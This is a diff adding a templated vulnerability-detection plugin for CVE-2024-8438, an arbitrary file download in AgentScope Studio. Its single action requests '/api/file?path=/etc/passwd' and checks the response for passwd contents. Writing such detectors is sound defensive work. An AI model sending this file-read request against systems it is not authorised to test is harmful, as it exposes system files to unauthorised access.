@@ -1,0 +1,67 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "AgentScope_CVE_2024_8438"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version,"
+    " rdj (rdj@crackatoa.id) for the original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "AgentScope_CVE_2024_8438"
+  }
+  severity: HIGH
+  title: "CVE-2024-8438 Agentscope Studio API Arbitrary File Download"
+  description: 
+    "Agentscope studio version 0.1.1 and prior is vulnerable to Arbitrary File Download via"
+    " api/file"
+  recommendation:
+    "Ensure this service is not exposed to the public internet. Restrict access"
+    " using firewall rules, VPN, or an allowlist to limit exposure to only"
+    " trusted users and networks."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2024-8438"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "read_etc_passwd"
+  http_request: {
+    method: GET
+    uri: "/api/file?path=/etc/passwd"
+    response: {
+      http_status: 200
+      expect_all {
+        conditions: [
+          { body: {} contains: 'root:' },
+          { header: { name: "Content-Disposition" } contains: "filename=passwd"}
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "read_etc_passwd"
+  ]
+}
+
